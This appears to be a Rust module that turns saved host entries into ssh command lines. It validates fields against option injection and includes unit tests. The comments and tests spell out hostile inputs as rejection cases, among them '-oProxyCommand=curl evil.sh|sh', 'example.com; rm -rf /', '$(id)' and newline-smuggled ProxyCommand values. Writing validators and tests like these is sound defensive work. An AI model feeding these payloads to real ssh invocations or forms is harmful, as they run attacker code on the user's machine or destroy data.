//! Turning a saved host into an `ssh` command line.
//!
//! This is the security-critical file in the crate, and the reason it is one
//! file with its own tests. `ssh` takes its options as arguments, so a field
//! that reaches the argument list unchecked is not a string — it is an
//! option. An address of `-oProxyCommand=curl evil.sh|sh` is a documented way
//! to turn "connect to this host" into "run this on my laptop", and it has
//! bitten real software repeatedly.
//!
//! Nothing here goes near a shell. The argv is handed to the process spawner
//! as a list, so quoting and word splitting never happen — but that is only
//! half the problem, and this file is the other half.

use crate::host::Host;

#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum HostError {
    #[error("a host needs an address")]
    NoAddress,
    #[error(
        "`{0}` cannot start with a dash. ssh would read it as an option rather than a name, \
         which is how a hostname becomes a command"
    )]
    LooksLikeAnOption(String),
    #[error("`{field}` contains something that is not allowed in one: {value}")]
    NotAllowed { field: &'static str, value: String },
    #[error("a port of 0 is not a port")]
    ZeroPort,
}

/// Characters allowed in a hostname, an address, or a `~/.ssh/config` name.
///
/// Letters, digits, and the four punctuation marks that appear in real names:
/// dot, dash, underscore and colon — the last for an IPv6 literal. Everything
/// else is refused rather than escaped. Escaping is a promise about a parser
/// somebody else wrote; refusing is a fact.
fn address_ok(value: &str) -> bool {
    !value.is_empty()
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ':' | '%'))
}

/// Characters allowed in a user name.
///
/// POSIX is stricter than most systems are in practice, so this permits what
/// real accounts use — including the backslash a Windows domain login has —
/// and nothing that could be read as an option or a separator.
fn user_ok(value: &str) -> bool {
    !value.is_empty()
        && value.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '\\'))
}

fn check(field: &'static str, value: &str, ok: fn(&str) -> bool) -> Result<(), HostError> {
    // A leading dash is checked before the character rules, so the error says
    // the useful thing rather than "contains a dash".
    if value.starts_with('-') {
        return Err(HostError::LooksLikeAnOption(value.to_string()));
    }
    if !ok(value) {
        return Err(HostError::NotAllowed { field, value: value.to_string() });
    }
    Ok(())
}

/// A path may hold almost anything, but it may not be an option and may not
/// carry a newline — the one character that can turn one line of a config
/// file into two.
fn check_path(field: &'static str, value: &str) -> Result<(), HostError> {
    if value.starts_with('-') {
        return Err(HostError::LooksLikeAnOption(value.to_string()));
    }
    if value.is_empty() || value.contains(['\n', '\r', '\0']) {
        return Err(HostError::NotAllowed { field, value: value.to_string() });
    }
    Ok(())
}

/// Check a host without building anything, for the moment it is saved.
///
/// Validated on the way in as well as on the way out. A host that is refused
/// only at connect time is a host somebody saved, walked away from, and finds
/// broken later — and the message is worth more beside the field that caused
/// it.
pub fn validate(host: &Host) -> Result<(), HostError> {
    let address = host.address.trim();
    if address.is_empty() {
        return Err(HostError::NoAddress);
    }
    check("address", address, address_ok)?;

    let user = host.user.trim();
    if !user.is_empty() {
        check("user", user, user_ok)?;
    }

    if let Some(0) = host.port {
        return Err(HostError::ZeroPort);
    }

    if let Some(identity) = host.identity_file.as_deref().map(str::trim) {
        if !identity.is_empty() {
            check_path("identity file", identity)?;
        }
    }

    if let Some(jump) = host.jump.as_deref().map(str::trim) {
        if !jump.is_empty() {
            // A jump target is `[user@]host[:port]`, and every part of it
            // reaches ssh as an argument exactly as this one does.
            check("jump host", jump, |v| {
                v.split('@').count() <= 2
                    && v.split('@').all(|part| !part.is_empty() && address_ok(part))
            })?;
        }
    }

    Ok(())
}

/// The arguments to run, after the program name.
///
/// `--` before the destination, so that even if every check above were
/// somehow passed, ssh would still read what follows as a host rather than
/// as an option. Belt and braces on the one argument that is not a fixed
/// string.
pub fn ssh_args(host: &Host) -> Result<Vec<String>, HostError> {
    validate(host)?;

    let mut args = Vec::new();

    if let Some(port) = host.port {
        args.push("-p".to_string());
        args.push(port.to_string());
    }

    if let Some(identity) = host.identity_file.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
        args.push("-i".to_string());
        args.push(identity.to_string());
    }

    if let Some(jump) = host.jump.as_deref().map(str::trim).filter(|s| !s.is_empty()) {
        args.push("-J".to_string());
        args.push(jump.to_string());
    }

    // Ask for a terminal explicitly. Without it, ssh decides based on whether
    // *its own* stdin is a tty — which it is, since it runs in a pty — but
    // saying so is what makes a jump host behave the same as a direct one.
    args.push("-t".to_string());

    args.push("--".to_string());

    let user = host.user.trim();
    let address = host.address.trim();
    args.push(if user.is_empty() {
        address.to_string()
    } else {
        format!("{user}@{address}")
    });

    Ok(args)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn host(address: &str) -> Host {
        Host {
            id: "h1".into(),
            label: String::new(),
            address: address.into(),
            user: String::new(),
            port: None,
            identity_file: None,
            jump: None,
            last_used: 0,
        }
    }

    #[test]
    fn the_simplest_host_is_just_a_name() {
        assert_eq!(ssh_args(&host("example.com")).unwrap(), ["-t", "--", "example.com"]);
    }

    #[test]
    fn a_user_is_joined_to_the_address() {
        let mut h = host("example.com");
        h.user = "deploy".into();
        assert_eq!(ssh_args(&h).unwrap().last().unwrap(), "deploy@example.com");
    }

    #[test]
    fn a_port_an_identity_and_a_jump_all_appear() {
        let mut h = host("example.com");
        h.port = Some(2222);
        h.identity_file = Some("~/.ssh/deploy_ed25519".into());
        h.jump = Some("bastion.example.com".into());

        assert_eq!(
            ssh_args(&h).unwrap(),
            [
                "-p",
                "2222",
                "-i",
                "~/.ssh/deploy_ed25519",
                "-J",
                "bastion.example.com",
                "-t",
                "--",
                "example.com"
            ]
        );
    }

    #[test]
    fn the_destination_always_comes_after_a_double_dash() {
        // Belt and braces on the one argument that is not a fixed string.
        let args = ssh_args(&host("example.com")).unwrap();
        let dashes = args.iter().position(|a| a == "--").unwrap();
        assert_eq!(dashes, args.len() - 2);
    }

    #[test]
    fn refuses_an_address_that_is_really_an_option() {
        // The documented way to turn "connect to this host" into "run this on
        // my laptop".
        for evil in [
            "-oProxyCommand=curl evil.sh|sh",
            "-oProxyCommand=/bin/sh",
            "--rsh=sh",
            "-l",
        ] {
            let err = ssh_args(&host(evil)).unwrap_err();
            assert!(matches!(err, HostError::LooksLikeAnOption(_)), "{evil}: {err}");
        }
    }

    #[test]
    fn refuses_an_address_with_anything_a_shell_would_notice() {
        for evil in [
            "example.com; rm -rf /",
            "example.com`id`",
            "example.com$(id)",
            "example.com|sh",
            "example.com evil.com",
            "example.com\nProxyCommand sh",
            "exam\0ple.com",
            "example.com'",
        ] {
            assert!(ssh_args(&host(evil)).is_err(), "accepted {evil:?}");
        }
    }

    #[test]
    fn accepts_the_addresses_real_machines_have() {
        for good in [
            "example.com",
            "db-01.internal",
            "my_box",
            "192.168.1.10",
            "2001:db8::1",
            "fe80::1%eth0",
            "prod",
        ] {
            assert!(ssh_args(&host(good)).is_ok(), "refused {good}");
        }
    }

    #[test]
    fn refuses_a_user_that_is_really_an_option() {
        let mut h = host("example.com");
        h.user = "-oProxyCommand=sh".into();
        assert!(matches!(ssh_args(&h), Err(HostError::LooksLikeAnOption(_))));
    }

    #[test]
    fn refuses_a_user_with_a_separator_in_it() {
        // `a@b@c` and `a b` both change which machine is reached.
        for evil in ["deploy@elsewhere", "deploy evil", "deploy;id", "deploy:x"] {
            let mut h = host("example.com");
            h.user = evil.into();
            assert!(ssh_args(&h).is_err(), "accepted {evil}");
        }
    }

    #[test]
    fn accepts_the_users_real_accounts_have() {
        for good in ["deploy", "root", "ubuntu", "first.last", "CORP\\alice", "svc_web-01"] {
            let mut h = host("example.com");
            h.user = good.into();
            assert!(ssh_args(&h).is_ok(), "refused {good}");
        }
    }

    #[test]
    fn refuses_an_identity_file_that_is_really_an_option() {
        let mut h = host("example.com");
        h.identity_file = Some("-oProxyCommand=sh".into());
        assert!(matches!(ssh_args(&h), Err(HostError::LooksLikeAnOption(_))));
    }

    #[test]
    fn a_path_may_hold_spaces_but_never_a_newline() {
        // A newline is the one character that turns one line of a config
        // file into two.
        let mut h = host("example.com");
        h.identity_file = Some("/home/a person/.ssh/id_ed25519".into());
        assert!(ssh_args(&h).is_ok());

        h.identity_file = Some("/tmp/key\nProxyCommand sh".into());
        assert!(ssh_args(&h).is_err());
    }

    #[test]
    fn refuses_a_jump_host_by_the_same_rules_as_a_host() {
        // It reaches ssh as an argument in exactly the same way.
        let mut h = host("example.com");
        for evil in ["-oProxyCommand=sh", "bastion; id", "a@b@c", "@bastion"] {
            h.jump = Some(evil.into());
            assert!(ssh_args(&h).is_err(), "accepted jump {evil}");
        }

        h.jump = Some("jump@bastion.example.com".into());
        assert!(ssh_args(&h).is_ok());
    }

    #[test]
    fn refuses_a_host_with_no_address() {
        assert_eq!(ssh_args(&host("   ")), Err(HostError::NoAddress));
    }

    #[test]
    fn refuses_a_port_of_zero() {
        let mut h = host("example.com");
        h.port = Some(0);
        assert_eq!(ssh_args(&h), Err(HostError::ZeroPort));
    }

    #[test]
    fn surrounding_whitespace_is_trimmed_rather_than_refused() {
        let mut h = host("  example.com  ");
        h.user = "  deploy ".into();
        assert_eq!(ssh_args(&h).unwrap().last().unwrap(), "deploy@example.com");
    }

    #[test]
    fn an_empty_optional_field_is_absent_rather_than_empty() {
        // An `-i ""` on the command line is worse than no `-i` at all.
        let mut h = host("example.com");
        h.identity_file = Some("  ".into());
        h.jump = Some(String::new());
        assert_eq!(ssh_args(&h).unwrap(), ["-t", "--", "example.com"]);
    }

    #[test]
    fn validating_and_building_agree_about_every_host() {
        // The panel refuses on save using `validate`; the spawn refuses using
        // `ssh_args`. Two rules would mean a host that saves and will not
        // connect.
        for address in ["example.com", "-evil", "a b", "", "2001:db8::1"] {
            let h = host(address);
            assert_eq!(validate(&h).is_ok(), ssh_args(&h).is_ok(), "{address}");
        }
    }
}
